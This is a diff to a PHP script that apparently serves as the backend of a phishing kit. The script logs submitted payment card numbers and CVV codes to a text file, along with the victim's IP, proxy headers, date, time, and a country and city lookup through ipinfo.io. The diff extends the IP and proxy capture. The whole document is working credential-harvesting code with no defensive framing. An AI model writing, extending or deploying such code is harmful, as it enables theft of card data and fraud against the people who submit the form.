@@ -2,22 +2,30 @@
 
 date_default_timezone_set('America/Caracas');
 ini_set("display_errors", 0);
-$userp = $_SERVER['REMOTE_ADDR'];
+$ip = $_SERVER['REMOTE_ADDR'];
+$ip_comp = $_SERVER['HTTP_CLIENT_IP'];
+$userp = $_SERVER['HTTP_X_FORWARDED'];
+$proxy = $_SERVER['HTTP_X_FORWARDED_FOR'];
 
-$cc = trim(file_get_contents("http://ipinfo.io/{$userp}/country"));
-$city = trim(file_get_contents("http://ipinfo.io/{$userp}/city"));
+
+$cc = trim(file_get_contents("http://ipinfo.io/{$proxy}/country"));
+$city = trim(file_get_contents("http://ipinfo.io/{$proxy}/city"));
+
+
 	
 	$file = fopen("NEW01.txt", "a");
 	
 fwrite($file, 
 "* TARJETA: ".$_POST['ntarjeta']."
 * CVV: ".$_POST['codigo']."
-* F-H-IP-P-C: 
-".date('Y-m-d')."
-".date('H:i:s')."
+* FECHA: ".date('Y-m-d')."
+* HORA: ".date('H:i:s')."
+* IP: ".$ip."
+* PROXY: ".$proxy."
+* IP COMPARTIDA: ".$ip_comp."
 ".$userp."
 ".$cc."
-".$city."  
+".$city."   
 " . PHP_EOL);
 fwrite($file, "==============================" . PHP_EOL);
 fclose($file);
